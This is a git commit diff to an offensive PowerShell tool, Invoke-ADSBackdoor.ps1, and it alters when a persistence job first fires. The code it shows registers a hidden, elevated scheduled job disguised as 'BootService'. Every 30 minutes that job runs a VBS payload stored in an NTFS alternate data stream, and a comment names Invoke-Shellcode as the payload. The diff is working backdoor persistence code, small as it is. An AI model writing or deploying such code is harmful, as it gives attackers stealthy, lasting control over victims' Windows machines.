a7a0063f3495a7a1a64a177072d1f56c94797fa1
simonpunk <simonp230446@hotmail.com>
2016-07-09 22:21:25 +0800

    Update Invoke-ADSBackdoor.ps1

--- Invoke-ADSBackdoor.ps1
+++ Invoke-ADSBackdoor.ps1
@@ -96,7 +96,7 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     else {
        $script = "wscript.exe $env:USERPROFILE\AppData:$vbsFile"
        $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
-       $Trig = New-JobTrigger -Once -At (Get-Date).Date -RepeatIndefinitely -RepetitionInterval "00:30:00"
+       $Trig = New-JobTrigger -Once -At (Get-Date).AddMinutes(1) -RepeatIndefinitely -RepetitionInterval "00:30:00"
        $scriptblock = [scriptblock]::Create($script)
        Register-ScheduledJob -Name BootService -ScriptBlock $scriptblock -Trigger $Trig -ScheduledJobOption $Option
        "Process Complete. Persistent schtask is created and will be triggered on every 30 mins."
